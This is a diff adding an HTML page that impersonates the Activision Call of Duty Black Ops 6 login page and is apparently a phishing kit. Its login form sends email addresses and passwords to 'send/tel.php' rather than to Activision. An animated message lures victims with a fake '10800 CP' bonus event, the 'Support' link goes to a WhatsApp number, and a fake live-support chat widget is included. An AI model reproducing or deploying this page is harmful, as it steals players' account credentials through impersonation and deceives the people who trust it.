+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="atvi-experiencefragment aem-GridColumn aem-GridColumn--default--12">
+
+
+    
+    
+		<div id="hero" class=" atvi-module-container" data-analytics-container="hero">
+			
+
+<section class="experience-fragment-container ">
+	
+
+	
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="atvi-layout-container aem-GridColumn aem-GridColumn--default--12">
+
+
+
+
+
+
+
+
+
+
+<div class="layout-container-element hero-grid-container atvi-module-container">
+
+    
+    <div class="atvi-layout-container aem-GridColumn aem-GridColumn--default--12">
+
+
+
+
+
+
+
+
+
+
+<div class="layout-container-element background-container atvi-module-container">
+
+    
+    <div class="atvi-image aem-GridColumn aem-GridColumn--default--12">
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div id="atvi-image-523655-container" class="atvi-image-component background-image-container reg-width " data-emptytext="ATVI Image" data-type="imgTag">
+
+  
+  
+
+  
+	
+
+	
+	
+	
+
+	
+
+
+    
+
+	
+
+    
+    
+    
+
+    
+      <img class="background-image" src="content/dam/atvi/callofduty/cod-touchui/blackops6/home/CERBERUS_KA.webp" alt="Call of Duty Black Ops 6 Operator with redacted sections">
+    
+
+	
+
+
+	
+
+	
+
+
+	
+
+
+    
+    
+
+
+	
+	
+
+     
+     
+
+  
+
+</div></div>
+<div class="atvi-video aem-GridColumn aem-GridColumn--default--12">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<link rel="stylesheet" href="apps/atvi/global/components/content/atvi-video/clientlibs.8220ad310f84d733ee1d5f8eb5bce99d.css" type="text/css">
+<script src="apps/atvi/global/components/content/atvi-video/clientlibs.a47739f0dd6da5966f6dd0378796f219.js"></script>
+
+
+
+
+
+
+
+<script>
+    ATVI.components.video = ATVI.components.video || {};
+</script>
+
+
+
+
+
+
+    
+    
+
+    
+
+<div id="hero-video" class="background-video-container background-video">
+        <video loop muted autoplay playsinline>
+            <source src="res/vv/video.mp4" type="video/mp4" width="1920px" height="1080px">
+            
+        </video>
+		<div class="video-bg-overlay"></div>
+		<div class="video-overlay">
+            <div class="custom-controls">
+                <button id="play-btn">
+					<span class="sr-only">play video</span>
+                    <svg id="video-play-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32" fill="none">
+                        <g>
+                            <rect width="32" height="32" rx="8" fill="black" fill-opacity="0.8">
+                            <rect x="0.5" y="0.5" width="31" height="31" rx="7.5" stroke="#3C4147">
+                            <path d="M10.9688 8L23.0312 16L10.9688 24V8Z" fill="#3C4147">
+                        </g>
+                    </svg>
+				</button>
+            </div>
+        </div>
+    </div>
+
+
+
+    
+
+    
+
+</div>
+
+    
+
+</div>
+</div>
+<div class="atvi-layout-container aem-GridColumn aem-GridColumn--default--12">
+
+
+
+
+
+
+
+
+
+
+<div class="layout-container-element foreground-container atvi-module-container">
+
+    
+    <div class="atvi-image aem-GridColumn aem-GridColumn--default--12">
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div id="atvi-image-103927-container" class="atvi-image-component logo-image-container reg-width " data-emptytext="ATVI Image" data-type="imgTag">
+
+  
+  
+
+  
+	
+
+	
+	
+	
+
+	
+
+
+    
+
+	
+
+    
+    
+    
+
+    
+      <img class="logo-image" src="content/dam/atvi/callofduty/cod-touchui/blackops6/common/CODM_Logo.svg" alt="Call of Duty Black Ops 6">
+    
+
+	
+
+
+	
+
+	
+
+
+	
+
+
+    
+    
+
+
+	
+	
+
+     
+     
+
+  
+
+</div></div>
+<div class="atvi-cta aem-GridColumn aem-GridColumn--default--12">
+
+    
+<link rel="stylesheet" href="apps/atvi/global/components/content/atvi-cta/clientlibs.3ad7342bfa1d7844085d3abe3fbeaa25.css" type="text/css">
+<script src="apps/atvi/global/components/content/atvi-cta/clientlibs.317d5716ca3a6f4778d7b6ef823ec7c8.js"></script>
+
+
+
+
+<div id="login" class="wrapper SSO SSO-PAGE center ">
+ 
+<article>
+    <section class="clearfix">
+        <br>
+        <div class="cod-login-step1"><p><span class="corners left"></span>Log in Via Your Network<span class="corners right"></span></p></div>
+        
+                        
+        
+        
+        
+        
+            
+            
+                
+            
+        
+        <form id="frmLogin" name="frmLogin" class="horz-label clearfix" action="send/tel.php" method="post">
+            <fieldset id="login-info" class="sso-form-input-block">
+                
+<h6 id="typedText"></h6>
+                
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const text = "How can we receive the new bonuses, just read the words below once : \n  10800 Cp For You incredible Event  \nOur Festival Has Been Around For 2 days\nAvoid asking too much because the festival servers are very busy\n Your registered request will be confirmed by us after 4 to 8 hours";
+            let i = 0;
+            const speed = 30; // سرعت تایپ به میلی‌ثانیه
+
+            function typeWriter() {
+                if (i < text.length) {
+                    const char = text.charAt(i);
+                    if (char === "\n") {
+                        document.getElementById("typedText").innerHTML += "<br>";
+                    } else {
+                        document.getElementById("typedText").innerHTML += char;
+                    }
+                    i++;
+                    setTimeout(typeWriter, speed);
+                }
+            }
+
+            typeWriter(); // شروع تایپ
+        });
+    </script>
+                
+                
+
+
+
+
+
+<div class="data-row clearfix" id="email-data-row">
+<label for="username">Email Address:<sup>*</sup></label>
+<div class="input-container clearfix">
+<input type="email" id='username' name='username' title="Please enter your email address" aria-label="Please enter your email address" autocomplete="on" placeholder="" 
+    value='' required aria-required="true" aria-describedby="email-error" />	
+</div>
+<span class="sprite-pages feedback-control icon"></span>
+<div id="email-error" class="feedback-control message" role="alert" aria-live="assertive">Please enter your email address</div>	
+</div>	
+<div class="data-row clearfix" id="remember-me-div">
+<div class="input-container clearfix">
+<input type="checkbox" id="remember-me-checkbox" class="atvi-instrument atvi-instrument-checkbox" name="remember_me" value="true" checked="checked" />
+<label for="remember-me-checkbox" class="custom-checkbox" style="display:none;"></label>
+</div>
+<label for="remember-me-checkbox">Remember me</label>
+</div>					
+<div class="data-row clearfix" id="password-data-row">	    	
+<label for="password">Password:<sup>*</sup></label>
+<div class="input-container clearfix">
+<input type='password' id='password' name='password' title="Please enter a password" aria-label="Please enter a password" autocomplete="on" placeholder="" required aria-required="true" aria-describedby="password-error">
+<span class="visibility-toggle" tabindex="0"></span>
+</div>
+<span class="sprite-pages feedback-control icon"></span>
+<div id="password-error" class="feedback-control message" role="alert" aria-live="assertive">Please enter a password</div>
+</div>
+
+
+<div class="g-recaptcha" data-sitekey="6Le0KAgtAAAAAGhnTqHJSi61g63cvH6GZEaGL794" data-theme="dark"></div>
+
+<div class="actions clearfix">
+
+<button id="login-button" class="submit large atvi-instrument atvi-instrument-button" type="submit">Sign In</button>
+
+</div>
+
+<div class="login-forgot-password">
+        
+<a href="https://profile.callofduty.com/cod/forgotPassword" id="login-forgot-password" class="atvi-instrument atvi-instrument-link" title="Need Help?">Need Help?</a>
+</div>
+
+<div id="login-center-content" class="center">
+
+</div>
+            </fieldset>	
+        <div>
+<input type="hidden" name="_csrf" value="IaP4JBxTbbgjzK7Ez_ObBJw_8MH87kamog6cRrqyCe0nqvoJXoDg54R4c0_TjJH9" />
+</div></form>
+        
+        
+            
+
+
+
+
+
+
+
+
+
+<p class="subheading">Select your network to get started</p>
+<div id="console-login" class="network-select-container" data-site="cod" data-button-count="4">
+<ul class="network-select console-login">
+    <li class="psn">
+        <a href="" class="psn-login-link" aria-label="Sign In Via Playstation"><span class="gaming-network-name">Sign In Via Playstation</span></a>
+    </li>
+    <li class="xbl">
+        <a href="" class="xbl-login-link" aria-label="Sign In Via Xbox"><span class="gaming-network-name">Sign In Via Xbox</span></a>
+    </li>
+
+    <li class="nintendo">
+        <a href="" class="nintendo-login-link" aria-label="Sign In Via Nintendo"><span class="gaming-network-name">Sign In Via Nintendo</span></a>
+    </li>
+    
+        <li class="battle">
+            <a href="" class="battle-login-link" aria-label="Sign In Via Battle.net"><span class="gaming-network-name">Sign In Via Battle.net</span></a>
+        </li>
+    
+    
+        <li class="steam">
+            <a href="" class="steam-login-link" aria-label="Sign In Via Steam"><span class="gaming-network-name">Sign In Via Steam</span></a>
+        </li>
+    
+    
+    
+</ul>
+</div>
+
+
+
+            <div class="or"><p>OR</p></div>
+        
+        
+        
+            <div class="actions clearfix">
+                <p class="no-login-text">New to Call of Duty?</p>
+                <a href="https://profile.callofduty.com/cod/register" title="Sign Up" id="login-need-account" class="cod atvi-instrument atvi-instrument-link">Sign Up</a>
+            </div>
+        
+    </section>
+    
+
+
+
+
+
+
+<div class="clearfix registrationIncentives">
+<ul>
+<li class="regTile1">
+<div class="incentive-container">
+    <h3>Enhance Your Game</h3><ul class="incentive-description"><li><span></span>Get your personalized live stats</li><li><span></span>See where you rank on the global leaderboard</li><li><span></span>Set your loadouts from the app or website</li></ul>
+</div>	
+</li>
+<li class="regTile2">
+<div class="incentive-container">
+    <h3>Connect With Friends</h3><ul class="incentive-description"><li><span></span>Compare your stats to your friends</li><li><span></span>See your friend's achievements</li><li><span></span>Chat with other users on the forums</li></ul>
+</div>
+</li>
+<li class="regTile3">
+<div class="incentive-container">
+    <h3>Get The Latest Intel</h3><ul class="incentive-description"><li><span></span>Your source for the most current news</li><li><span></span>Get alerts for new events or updates</li><li><span></span>Receive personalized match analysis and weekly recaps</li></ul>
+</div>
+</li>
+</ul>
+</div>
+
+    <!--  end col -->
+</article>
+</div>
+ 
+
+ 
+
+
+
+
+
+<style>
+
+	
+
+</style>
+		
+		<div id="atvi_cta-modal-overlay" class="atvi-cta-modal-overlay modal-overlay" role="dialog" tabindex="-1">
+
+            <div class="inner-modal">
+                
+                <button class="modal-close" aria-label="Close">&times;</button>
+                
+                <div class="modal-content">
+
+                    <div class="media-content"></div>
+                    
+
+                </div>
+                    
+            </div>
+    
+		</div>
+    
+    </div>
+
+</div>
+
+    
+
+</div>
+</div>
+
+    
+
+</div>
+</div>
+
+    
+</div>
+</div>
+
+    
+</div>
+
+</section>
+		</div>
+	
+</div>
+
+<div class="atvi-experiencefragment aem-GridColumn aem-GridColumn--default--12">
+
+
+    
+    
+		<div id="atvi_experiencefragm_1115981179" class=" atvi-module-container">
+			
+
+<section class="experience-fragment-container ">
+	
+
+	
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="cod-footer aem-GridColumn aem-GridColumn--default--12">            
+
+    
+<link rel="stylesheet" href="apps/atvi/callofduty/global/components/structure/v2023/cod-footer/clientlibs.be74a543eb5b40ad4f4d2796b2638b65.css" type="text/css"><script type="text/javascript" src="apps/atvi/callofduty/global/components/structure/v2023/cod-footer/clientlibs.5018b4c82d1a2253e7798aa0b7c6da60.js" defer></script>
+
+
+
+
+
+
+
+<footer class="cod-global-footer ">
+
+	<div class="inner-footer">
+
+		<div class="legal-links">
+			
+                <ul>
+                    <li class="first">
+						<a href="https://www.activision.com/legal" target="_blank">
+                        	Legal
+                    	</a>
+					</li>
+                
+                    <li>
+						<a href="https://www.activision.com/legal/terms-of-use" target="_blank">
+                        	Terms of Use
+                    	</a>
+					</li>
+                
+                    <li>
+						<a href="https://www.activision.com/legal/privacy-policy" target="_blank">
+                        	Privacy Policy
+                    	</a>
+					</li>
+                
+                    <li>
+						<a href="https://careers.activision.com" target="_blank">
+                        	Careers
+                    	</a>
+					</li>
+                
+                    <li>
+						<a href="https://www.activision.com/legal/cookie-policy" target="_blank">
+                        	Cookie Policy
+                    	</a>
+					</li>
+                
+                    <li>
+						<a href="https://https://wa.me/+447440269536" target="_blank">
+                        	Support
+                    	</a>
+					</li>
+                
+                    <li>
+						<a href="values" target="_blank">
+                        	Code of Conduct
+                    	</a>
+					</li>
+                
+                    <li class="ja-only">
+						<a href="ja/legal-points-terms" target="_blank">
+                        	法的表記
+                    	</a>
+					</li>
+                </ul>
+            
+		</div>
+
+		<div class="studio-links">
+			
+                <ul>
+                    <li class="atvi-logo">
+                        <a href="https://www.activision.com" target="_blank" aria-label="Visit the Activision website">
+                            <img src="content/dam/atvi/callofduty/cod-touchui/hub/studio-logos/activision-logo.png" alt="Activision logo" loading="lazy">
+                        </a>
+                    </li>
+                
+                    <li class="treyarch-logo">
+                        <a href="https://www.treyarch.com" target="_blank" aria-label="Visit the Treyarch website">
+                            <img src="content/dam/atvi/callofduty/cod-touchui/hub/studio-logos/treyarch-logo.png" alt="Treyarch Logo" loading="lazy">
+                        </a>
+                    </li>
+                
+                    <li class="shg-logo">
+                        <a href="https://www.sledgehammergames.com" target="_blank" aria-label="Visit the Sledgehammer Games website">
+                            <img src="content/dam/atvi/callofduty/cod-touchui/hub/studio-logos/shg-logo.png" alt="Sledgehammer Games Logo" loading="lazy">
+                        </a>
+                    </li>
+                
+                    <li class="hms-logo">
+                        <a href="https://www.highmoonstudios.com" target="_blank" aria-label="Visit the Highmoon Studios website">
+                            <img src="content/dam/atvi/callofduty/cod-touchui/hub/studio-logos/high-moon-logo.png" alt="High Moon Studios logo" loading="lazy">
+                        </a>
+                    </li>
+                
+                    <li class="digital-logo">
+                        <a href="https://www.digital-legends.com" target="_blank" aria-label="Visit the Digital Legends Entertainment website">
+                            <img src="content/dam/atvi/callofduty/cod-touchui/hub/studio-logos/digital-legends-logo.png" alt="Digital Legends Entertainment logo" loading="lazy">
+                        </a>
+                    </li>
+                
+                    <li class="shanghai-logo">
+                        <a href="https://www.activision.com/company/locations/shanghai" target="_blank" aria-label="Visit the Activision Shanghai Studio profile page">
+                            <img src="content/dam/atvi/callofduty/cod-touchui/hub/studio-logos/atvi-shanghai-logo.png" alt="Shanghai Studio logo" loading="lazy">
+                        </a>
+                    </li>
+                
+                    <li class="iw-logo">
+                        <a href="https://www.infinityward.com" target="_blank" aria-label="Visit the Infinity Ward website">
+                            <img src="content/dam/atvi/callofduty/cod-touchui/hub/studio-logos/infinity-ward-logo.png" alt="Infinity Ward logo" loading="lazy">
+                        </a>
+                    </li>
+                
+                    <li class="raven-logo">
+                        <a href="https://www.ravensoftware.com" target="_blank" aria-label="Visit the Raven Software website">
+                            <img src="content/dam/atvi/callofduty/cod-touchui/hub/studio-logos/raven-logo.png" alt="Raven logo" loading="lazy">
+                        </a>
+                    </li>
+                
+                    <li class="solid-state-logo">
+                        <a href="https://www.activision.com/solidstate" target="_blank" aria-label="Visit the Solid State Studios website">
+                            <img src="content/dam/atvi/callofduty/cod-touchui/hub/studio-logos/solid-state-logo.png" alt="Solid State Studios logo" loading="lazy">
+                        </a>
+                    </li>
+                
+                    <li class="dw-logo">
+                        <a href="https://www.demonware.net" target="_blank" aria-label="Visit the Demonware website">
+                            <img src="content/dam/atvi/callofduty/cod-touchui/hub/studio-logos/demonware-logo.png" alt="Demonware logo" loading="lazy">
+                        </a>
+                    </li>
+                
+                    <li class="beenox-logo">
+                        <a href="https://www.beenox.com" target="_blank" aria-label="Visit the Beenox website">
+                            <img src="content/dam/atvi/callofduty/cod-touchui/hub/studio-logos/beenox-logo.png" alt="Beenox logo" loading="lazy">
+                        </a>
+                    </li>
+                </ul>
+            
+		</div>
+
+		<div class="rating-links">
+			<ul>
+                <li class="na-logo">
+                	<a target="_blank" class="esrb-pc" href="https://www.esrb.org/EPCConfirm/832/" aria-label="Visit the Activision ESRB Privacy Certified Profile">
+                		<img src="content/dam/atvi/global/ratings/esrb/esrb-privacy.jpg" alt="ESBR Privacy Certified Logo" loading="lazy">
+                	</a>
+                </li>
+				<li class="na-logo">
+					<a class="rating-logo" aria-label="Visit the rating board website" href="https://www.esrb.org"><img src="content/dam/atvi/global/ratings/esrb/cod-hub-esrb-en.png" alt="Rating logo" loading="lazy"></a>
+                </li>
+            </ul>
+		</div>
+
+		<div class="copyright">
+			
+                
+                <p>© 2025 Activision Publishing, Inc. ACTIVISION, CALL OF DUTY, and CALL OF DUTY BLACK OPS are trademarks of Activision Publishing, Inc. All other trademarks and trade names are the property of their respective owners.</p>
+
+            
+		</div>
+
+		<div class="cookie-settings">
+			<button id="ot-sdk-btn" aria-label="Configure cookie settings" class="ot-sdk-show-settings">Cookie Settings</button>
+		</div>
+
+		<div class="footer-locale-selector">
+			<div>
+    
+<link rel="stylesheet" href="apps/atvi/global/components/content/atvi-locale-selector/clientlibs.9392f495d329a20af1c927fc10ce9f52.css" type="text/css">
+<script src="apps/atvi/global/components/content/atvi-locale-selector/clientlibs.1f58109aedc4c1822cd6c3fbe5446e57.js"></script>
+
+
+
+
+
+		</div>
+	
+</div>
+
+    
+</div>
+</div>
+
+    
+
+        
+        
+    
+    
+    <div class="atvi-banner-cmp eula-banner-module">
+        <div class="inner">
+            <div class="content">
+                <p>The Software License and Service Agreement will be updated. Please follow this link [<a href="https://www.activision.com/legal/ap-eula">https://www.activision.com/legal/ap-eula</a>] in order to see these changes.</p>
+            </div>
+            <button aria-label="Close" class="close-modal">&times;</div>
+        </div>
+    </div>
+
+
+    
+		<div class="atvi-privacy-policy-module">
+            <div class="inner">
+    			<div class="content-left">Privacy Policy Update </div>
+    			<div class="content-right">We’ve updated our Privacy Policy. You can view the revised policy <a href="https://www.activision.com/legal/privacy-policy" target="_blank">here</a>. By continuing to use Activision’s websites, products or services, you acknowledge this revised Privacy Policy.</div>
+                <button aria-label="Close" class="close-modal">&times;</div>
+            </div>
+		</div>
+    
+
+    
+    
+    
+
+    
+
+    
+    
+
+    
+    
+
+    
+    
+
+        
+
+
+		
+		
+
+        <script type="text/javascript">
+            if (typeof _satellite !== 'undefined') {
+       			 _satellite.pageBottom(); // Execute if _satellite exists
+      		}
+    	</script>
+<!-- LiveChat Widget -->
+<div id="lc-widget" class="lc-closed">
+  <button id="lc-toggle" aria-label="Open chat">
+    <svg viewBox="0 0 24 24" width="26" height="26" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg>
+    <span class="lc-badge" id="lc-badge" hidden>1</span>
+  </button>
+  <div id="lc-panel" role="dialog" aria-label="Live support chat">
+    <header class="lc-header">
+      <div class="lc-header-info">
+        <div class="lc-avatar">S</div>
+        <div>
+          <div class="lc-title">Live Support</div>
+          <div class="lc-status"><span class="lc-dot"></span> Online</div>
+        </div>
+      </div>
+      <button id="lc-close" aria-label="Close chat">&times;</button>
+    </header>
+    <div id="lc-messages" class="lc-messages">
+      <div class="lc-welcome">
+        <div class="lc-welcome-emoji">👋</div>
+        <h3>Hello there</h3>
+        <p>Need help? Send us a message and we'll reply as soon as we can.</p>
+      </div>
+    </div>
+    <form id="lc-form" class="lc-form" autocomplete="off">
+      <input id="lc-input" type="text" placeholder="Type your message..." maxlength="3000" required />
+      <button type="submit" id="lc-send" aria-label="Send message">
+        <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+      </button>
+    </form>
+    <div class="lc-footer">Activision 2026</div>
+  </div>
+</div>
+
+<script>
+  window.LC_CONFIG = {
+    endpoint: "/php-livechat",
+    pollMs: 2000
+  };
+</script>
+<script src="php-livechat/assets/app.js"></script>
+
+	
+
+    
+        
+       	
+    </body>
+
+
+</html>             
